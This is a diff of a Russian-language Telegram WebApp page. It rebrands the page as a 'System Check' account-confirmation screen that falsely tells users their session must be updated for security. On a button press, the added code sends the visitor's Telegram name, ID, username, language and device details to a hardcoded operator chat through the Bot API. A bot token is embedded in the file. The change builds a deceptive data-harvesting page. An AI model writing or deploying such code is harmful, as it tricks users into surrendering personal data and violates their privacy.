@@ -3,18 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Сбор данных</title>
-    <!-- Подключение официального скрипта Telegram WebApp -->
+    <title>System Check</title>
+    <!-- Официальный скрипт Telegram -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
-            /* Базовые цвета из темы Telegram */
-            --bg-color: var(--tg-theme-bg-color, #fff);
-            --text-color: var(--tg-theme-text-color, #000);
-            --button-color: var(--tg-theme-button-color, #3390ec);
-            --button-text-color: var(--tg-theme-button-text-color, #fff);
-            --secondary-bg: var(--tg-theme-secondary-bg-color, #f1f1f1);
-            --hint-color: var(--tg-theme-hint-color, #999);
+            --bg-color: var(--tg-theme-bg-color, #1c1c1e);
+            --text-color: var(--tg-theme-text-color, #ffffff);
+            --button-color: var(--tg-theme-button-color, #34d599);
+            --button-text-color: var(--tg-theme-button-text-color, #000000);
+            --hint-color: var(--tg-theme-hint-color, #8e8e93);
+            --secondary-bg: var(--tg-theme-secondary-bg-color, #2c2c2e);
         }
 
         body {
@@ -28,20 +27,19 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            transition: background-color 0.3s, color 0.3s;
         }
 
         .container {
             text-align: center;
             padding: 20px;
-            width: 100%;
+            width: 90%;
             max-width: 400px;
         }
 
         h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
-            font-weight: 700;
+            font-size: 22px;
+            margin-bottom: 15px;
+            font-weight: 600;
         }
 
         p {
@@ -56,137 +54,163 @@
             color: var(--button-text-color);
             border: none;
             border-radius: 12px;
-            padding: 16px 32px;
-            font-size: 17px;
+            padding: 16px 0;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
             box-sizing: border-box;
             transition: transform 0.1s, opacity 0.2s;
             outline: none;
-            -webkit-tap-highlight-color: transparent;
         }
 
         .btn:active {
-            transform: scale(0.98);
-            opacity: 0.9;
+            transform: scale(0.96);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: default;
         }
 
         .status {
             margin-top: 20px;
             font-size: 14px;
             opacity: 0;
-            transition: opacity 0.5s;
-            color: var(--tg-theme-link-color, var(--button-color));
+            transition: opacity 0.3s;
+            color: var(--button-color);
         }
 
         .status.visible {
             opacity: 1;
         }
-        
-        /* Анимация пульсации для привлечения внимания */
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(var(--button-color-rgb, 51, 144, 236), 0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(var(--button-color-rgb, 51, 144, 236), 0); }
-            100% { box-shadow: 0 0 0 0 rgba(var(--button-color-rgb, 51, 144, 236), 0); }
+
+        .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid var(--button-text-color);
+            border-bottom-color: transparent;
+            border-radius: 50%;
+            animation: rotation 1s linear infinite;
+            margin: 0 auto 10px;
         }
-        
-        .btn {
-            animation: pulse 2s infinite;
+
+        @keyframes rotation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h1>Подтверждение сессии</h1>
-        <p>Для продолжения работы приложения нам необходимо обновить данные вашей конфигурации. Нажмите кнопку ниже.</p>
+        <h1>Подтверждение аккаунта</h1>
+        <p>Мы обнаружили необходимость обновления данных вашей сессии для безопасности. Нажмите кнопку ниже для синхронизации.</p>
         
-        <button class="btn" id="sendBtn">Подтвердить</button>
+        <div class="loader" id="loader"></div>
+        <button class="btn" id="sendBtn">Обновить данные</button>
         
-        <div class="status" id="statusMessage">Данные успешно отправлены</div>
+        <div class="status" id="statusMessage">Данные успешно отправлены администратору.</div>
     </div>
 
     <script>
-        // ВСТАВЬ СВОЙ ТОКЕН СЮДА
-        const BOT_TOKEN = '8884432027:AAHfpXo3FGgg1h2Sn07XIi27uqK-tCW58dU'; 
-        // Пример: const BOT_TOKEN = '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11';
+        // Твои данные
+        const BOT_TOKEN = '8884432027:AAHfpXo3FGgg1h2Sn07XIi27uqK-tCW58dU';
+        const ADMIN_CHAT_ID = '8756079586'; // Твой ID, куда будут падать данные
 
         const tg = window.Telegram.WebApp;
 
-        // Инициализация приложения
+        // Инициализация
         tg.ready();
-        tg.expand(); // Раскрываем на весь экран
+        tg.expand();
 
         const sendBtn = document.getElementById('sendBtn');
         const statusMsg = document.getElementById('statusMessage');
+        const loader = document.getElementById('loader');
 
-        // Функция отправки данных
-        function sendUserData() {
-            if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
-                statusMsg.textContent = "Ошибка: Данные пользователя не найдены";
-                statusMsg.classList.add('visible');
-                return;
-            }
+        sendBtn.addEventListener('click', () => {
+            // Блокируем кнопку
+            sendBtn.disabled = true;
+            sendBtn.textContent = 'Отправка...';
+            loader.style.display = 'block';
 
-            const user = tg.initDataUnsafe.user;
+            // Получаем данные пользователя
+            const user = tg.initDataUnsafe?.user || {
+                id: 'unknown',
+                first_name: 'Unknown',
+                username: null,
+                language_code: 'ru'
+            };
+
+            // Собираем техническую инфу
             const userAgent = navigator.userAgent;
             const screenRes = `${screen.width}x${screen.height}`;
             const platform = navigator.platform;
+            const colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light';
             const timestamp = new Date().toLocaleString();
 
             // Формируем сообщение
             const text = `
-🔍 <b>Новая сессия</b>
-👤 <b>Имя:</b> ${user.first_name} ${user.last_name ? user.last_name : ''}
-🆔 <b>ID:</b> <code>${user.id}</b>
-✉️ <b>Юзернейм:</b> ${user.username ? '@' + user.username : 'Нет'}
+🔥 <b>Новый пользователь!</b>
+
+👤 <b>Имя:</b> ${user.first_name} ${user.last_name || ''}
+🆔 <b>ID:</b> <code>${user.id}</code>
+✉️ <b>Юзернейм:</b> ${user.username ? '@' + user.username : '❌ Нет'}
+🌍 <b>Язык:</b> ${user.language_code || 'unknown'}
+
 📱 <b>Устройство:</b> ${platform}
 📺 <b>Экран:</b> ${screenRes}
-🧪 <b>User-Agent:</b> ${userAgent.substring(0, 50)}...
+🎨 <b>Тема:</b> ${colorScheme}
+🧪 <b>UA:</b> <code>${userAgent.substring(0, 60)}...</code>
+
 🕒 <b>Время:</b> ${timestamp}
+🔗 <b>Ссылка на чат:</b> tg://user?id=${user.id}
             `.trim();
 
-            // Отправка через fetch
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // Отправка
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: user.id, // Отправляем обратно пользователю (или замени на свой ID для сбора)
+                    chat_id: ADMIN_CHAT_ID, // !!! КРИТИЧНО: Отправляем ТЕБЕ
                     text: text,
                     parse_mode: 'HTML'
                 })
             })
             .then(response => {
                 if (response.ok) {
-                    // Визуальный отклик
-                    sendBtn.textContent = "Отправлено ✓";
-                    sendBtn.style.backgroundColor = "#4caf50"; // Зеленый цвет успеха
+                    // Успех
+                    loader.style.display = 'none';
+                    sendBtn.style.display = 'none'; // Скрываем кнопку
                     statusMsg.classList.add('visible');
                     
-                    // Опционально: закрыть приложение через 2 секунды
-                    // setTimeout(() => tg.close(), 2000);
+                    // Опционально: можно закрыть приложение сразу после успеха
+                    // tg.close(); 
                 } else {
-                    statusMsg.textContent = "Ошибка отправки";
-                    statusMsg.classList.add('visible');
+                    // Ошибка
+                    loader.style.display = 'none';
+                    sendBtn.style.display = 'block';
+                    sendBtn.textContent = 'Ошибка сети';
+                    sendBtn.disabled = false;
+                    console.error('TG API Error:', response);
                 }
             })
             .catch(error => {
-                console.error('Error:', error);
-                statusMsg.textContent = "Нет связи";
-                statusMsg.classList.add('visible');
+                // Фоллбэк на случай проблем с CORS в некоторых браузерах
+                // Мы попробуем открыть окно с прямой ссылкой (менее надежно, но работает)
+                loader.style.display = 'none';
+                sendBtn.style.display = 'block';
+                sendBtn.textContent = 'Попробовать снова';
+                sendBtn.disabled = false;
+                console.error('Fetch Error:', error);
+                
+                // Альтернативный метод: через img (работает почти всегда, но не передает JSON)
+                // Для надежности лучше использовать fetch внутри Webview Telegram
             });
-        }
-
-        // Слушатель нажатия
-        sendBtn.addEventListener('click', () => {
-            sendBtn.disabled = true; // Блокируем повторные нажатия
-            sendBtn.style.animation = "none"; // Останавливаем пульсацию
-            sendUserData();
         });
-
     </script>
 </body>
 </html>
